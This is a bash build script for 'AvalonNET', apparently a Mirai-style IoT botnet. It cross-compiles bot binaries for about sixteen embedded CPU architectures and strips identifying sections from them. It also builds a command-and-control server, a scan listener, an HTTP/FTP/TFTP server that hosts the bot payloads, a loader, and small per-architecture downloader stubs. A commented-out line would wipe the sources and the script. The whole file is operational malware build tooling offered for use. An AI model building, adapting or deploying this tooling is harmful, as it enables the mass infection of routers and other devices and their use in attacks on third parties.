#!/bin/bash
clear

echo "Build AvalonNET"
export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i486/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin

echo "Installing Go"
cd /tmp
wget https://dl.google.com/go/go1.21.5.linux-amd64.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
export GO111MODULE=on

go version
go env

echo "Building ScanListen..."
cd ~/AvalonNet
go build scanListen.go
rm scanListen.go
chmod +x scanListen

echo "Building cnc..."
cd cnc
go mod init avalonnet
go mod tidy
go get github.com/go-sql-driver/mysql
go get github.com/d1manpro/checkhost
go get golang.org/x/crypto/ssh
go get github.com/mattn/go-shellwords
go build -o ~/avalon_cnc *.go
cp go.mod go.sum ~/ 2>/dev/null
cd ~/AvalonNet
# rm -rf ~/cnc
ls -la avalon_cnc go.mod go.sum

echo "cross compilando.."

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -Ibot/headers -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -pthread -lpthread -o release/"$2" -DARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function compile_bot_arm7 {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -Ibot/headers -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -pthread -lpthread -o release/"$2" -DARCH=\""$1"\"
}

function arc_compile {
    "$1-linux-gcc" -std=c99 $3 bot/*.c -O3 -Ibot/headers -DARCH=\"$1\" -s -o release/"$2"
}

function sparc_compile {
    "$1-buildroot-linux-gnu-gcc" -std=c99 $3 bot/*.c -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -pthread -lpthread -DARCH=\"sparc\" -o release/"$2"
    "$1-buildroot-linux-gnu-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

mkdir release

echo "Building - arc"
arc_compile arc avalon.arc "-static"
echo "Building - i486"
compile_bot i486 avalon.i486 "-static"
echo "Building - i586"
compile_bot i586 avalon.x86 "-static"
echo "Building - i686"
compile_bot i686 avalon.i686 "-static"
echo "Building - x86_64"
compile_bot x86_64 avalon.x86_64 "-static"
echo "Building - mips"
compile_bot mips avalon.mips "-static"
echo "Building - mipsel"
compile_bot mipsel avalon.mpsl "-static"
echo "Building - armv4l"
compile_bot armv4l avalon.arm "-static"
echo "Building - armv5l"
compile_bot armv5l avalon.arm5 "-static"
echo "Building - armv6l"
compile_bot armv6l avalon.arm6 "-static"
echo "Building - armv7l"
compile_bot_arm7 armv7l avalon.arm7 "-static"
echo "Building - powerpc"
compile_bot powerpc avalon.ppc "-static"
echo "Building - powerpc-440fp"
compile_bot powerpc-440fp avalon.ppc440 "-static"
echo "Building - sparc"
sparc_compile sparc64 avalon.spc "-static"
echo "Building - m68k"
compile_bot m68k avalon.m68k "-static"
echo "Building - sh4"
compile_bot sh4 avalon.sh4 "-static"

cp release/avalon.* server/static
rm -rf release

echo "Building Server http/ftp..."
cd server
go mod init avalon_server 2>/dev/null
export GOPROXY=https://proxy.golang.org,direct
go get github.com/pin/tftp/v3
go get github.com/spf13/afero
go get github.com/fclairamb/ftpserverlib
go mod tidy
go build -o avalon_server main.go
cd ..

echo "Building Loader"
gcc -static -O3 -lpthread -pthread ./loader/src/*.c -o ./loader/loader

arc-linux-gcc -Os -D BOT_ARCH=\"arc\" -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.arc
i486-gcc -Os -D BOT_ARCH=\"i486\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.i486
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.x86
i686-gcc -Os -D BOT_ARCH=\"i686\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.i686
x86_64-gcc -Os -D BOT_ARCH=\"x86_64\" -D X64 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.x86_64
armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.arm7
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.mpsl
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.m68k
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.spc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.sh4
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.ppc
powerpc-440fp-gcc -Os -D BOT_ARCH=\"ppc440\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ./dlr/main.c -o ./dlr/release/dlr.ppc440

arc-linux-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.arc
i486-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.i486
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.x86
i686-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.i686
x86_64-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.x86_64
armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.arm7
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.mpsl
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.m68k
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.spc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.sh4
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.ppc
powerpc-440fp-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./dlr/release/dlr.ppc440

mv ./dlr/release/dlr* ./loader/bins
# rm -rf ~/dlr ~/loader/src ~/bot ~/scanListen.go ~/Projects ~/build.sh
